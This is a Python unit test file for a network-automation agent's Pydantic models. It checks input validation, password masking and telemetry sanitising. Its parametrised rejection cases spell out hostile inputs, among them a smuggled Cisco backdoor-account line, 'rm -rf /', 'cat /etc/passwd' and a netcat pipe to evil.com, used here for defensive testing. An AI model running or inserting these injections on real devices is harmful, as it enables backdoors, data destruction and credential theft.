"""Unit tests for models and Pydantic validation."""

import pytest
from pydantic import ValidationError

from networking_agent.models.device import DeviceInventory
from networking_agent.models.intent import NetworkIntent
from networking_agent.models.telemetry import TelemetryEvent


@pytest.mark.parametrize(
    "valid_interface",
    [
        "GigabitEthernet1/0/1",
        "Ethernet1/1",
        "ge-0/0/0",
        "ether1",
        "ether24",
        "sfp-sfpplus1",
        "wlan1",
        "bridge1",
        "vlan10",
        "bonding1",
    ],
)
def test_network_intent_accepts_valid_interfaces(valid_interface):
    intent = NetworkIntent(
        diagnosis="Valid interface test",
        severity="LOW",
        requires_config_change=True,
        action="disable_interface",
        target_interface=valid_interface,
    )
    assert intent.target_interface == valid_interface


@pytest.mark.parametrize(
    "malicious_interface",
    [
        "Ethernet1/1\n username backdoor privilege 15 secret 0 evil",
        "GigabitEthernet0/0; reload",
        "ge-0/0/0 && rm -rf",
        "Ethernet1/1 | nc evil.com 4444",
        "Ethernet 1/1",
        "invalid_interface_syntax!",
    ],
)
def test_network_intent_rejects_command_injection(malicious_interface):
    with pytest.raises(ValidationError):
        NetworkIntent(
            diagnosis="Malicious log attempted",
            severity="HIGH",
            requires_config_change=True,
            action="disable_interface",
            target_interface=malicious_interface,
        )


@pytest.mark.parametrize("invalid_mtu", [10, 67, 9217, 65535, -1500])
def test_network_intent_rejects_invalid_mtu(invalid_mtu):
    with pytest.raises(ValidationError):
        NetworkIntent(
            diagnosis="Bad MTU attempted",
            severity="LOW",
            requires_config_change=True,
            action="set_interface_mtu",
            target_interface="Ethernet1/1",
            mtu_value=invalid_mtu,
        )


@pytest.mark.parametrize("invalid_ip", ["999.999.999.999", "not_an_ip", "10.0.0.1; rm", "10.0.0.1\n"])
def test_network_intent_rejects_invalid_bgp_ip(invalid_ip):
    with pytest.raises(ValidationError):
        NetworkIntent(
            diagnosis="Invalid BGP neighbor",
            severity="MEDIUM",
            requires_config_change=True,
            action="reset_bgp_neighbor",
            bgp_neighbor_ip=invalid_ip,
        )


@pytest.mark.parametrize("empty_val", ["", "   ", "none", "null", "N/A", "None", None])
def test_network_intent_coerces_empty_fields_to_none(empty_val):
    intent = NetworkIntent(
        diagnosis="Normal condition detected, no action needed.",
        severity="LOW",
        requires_config_change=False,
        action="none",
        target_interface=empty_val,
        mtu_value=0 if empty_val in ["", None] else empty_val,
        bgp_neighbor_ip=empty_val,
    )
    assert intent.target_interface is None
    assert intent.mtu_value is None
    assert intent.bgp_neighbor_ip is None


def test_device_inventory_masks_password():
    dev = DeviceInventory(
        host="10.1.1.1",
        device_type="cisco_ios",
        username="admin",
        password="MySecretPassword123",  # type: ignore
    )
    # Ensure raw password string does not appear in __repr__
    assert "MySecretPassword123" not in repr(dev)
    # But netmiko dictionary gets the actual value
    net_dict = dev.to_netmiko_dict()
    assert net_dict["password"] == "MySecretPassword123"


@pytest.mark.parametrize(
    "malicious_host",
    [
        "../../etc/passwd",
        r"..\..\Windows\System32",
        "/etc/shadow",
        "192.168.1.1; rm -rf /",
        "10.0.0.1 && cat /etc/passwd",
        "10.0.0.1 | nc evil.com 4444",
        "10.0.0.1/evil",
        "10.0.0.1\\evil",
        "10.0.0.1\x00evil",
        "10.0.0.1 evil",
        "",
        "   ",
    ],
)
def test_device_inventory_rejects_malicious_host(malicious_host):
    with pytest.raises(ValidationError):
        DeviceInventory(host=malicious_host, device_type="cisco_ios")


def test_telemetry_event_sanitizes_null_bytes_and_length():
    # Strips null bytes
    event = TelemetryEvent(raw_text="System alert\x00 on ether1")
    assert event.raw_text == "System alert on ether1"

    # Rejects empty after strip
    with pytest.raises(ValidationError):
        TelemetryEvent(raw_text="   \x00\x00   ")

    # Rejects overly long payload (DoS defense)
    with pytest.raises(ValidationError):
        TelemetryEvent(raw_text="A" * 35000)
